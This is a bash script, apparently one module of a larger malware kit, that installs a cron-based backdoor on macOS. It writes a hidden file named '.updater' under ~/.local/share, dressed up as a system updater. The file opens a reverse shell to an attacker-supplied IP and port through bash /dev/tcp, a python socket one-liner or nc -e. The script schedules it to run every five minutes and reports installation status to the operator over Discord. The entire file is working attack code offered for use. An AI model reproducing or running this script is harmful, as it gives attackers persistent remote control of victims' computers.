#!/bin/bash
# ============================================================
# Cron Backdoor for macOS - Modular Remote Payload
# ============================================================
# Installs persistence via cron job
# Requires: $IP and $PT for reverse shell
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$IP" || -z "$PT" ]]; then
    send_discord "❌ Cron backdoor failed on $SYSID - Missing IP or PORT"
    exit 1
fi

# Create hidden persistence script
PERSIST_DIR="$HOME/.local/share"
mkdir -p "$PERSIST_DIR"
PERSIST_SCRIPT="$PERSIST_DIR/.updater"

cat > "$PERSIST_SCRIPT" << EOF
#!/bin/bash
# System updater service
/bin/bash -i >& /dev/tcp/$IP/$PT 0>&1 2>/dev/null || \
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" 2>/dev/null || \
nc -e /bin/bash $IP $PT 2>/dev/null
EOF

chmod +x "$PERSIST_SCRIPT"

# Add to crontab (runs every 5 minutes)
(crontab -l 2>/dev/null | grep -v ".updater"; echo "*/5 * * * * $PERSIST_SCRIPT >/dev/null 2>&1") | crontab -

# Verify
if crontab -l 2>/dev/null | grep -q ".updater"; then
    send_discord "🔒 **Persistence Installed on $SYSID**\n• Method: Cron (every 5 min)\n• Script: \`$PERSIST_SCRIPT\`\n• Target: \`$IP:$PT\`"
else
    send_discord "⚠️ Cron persistence may have failed on $SYSID"
fi

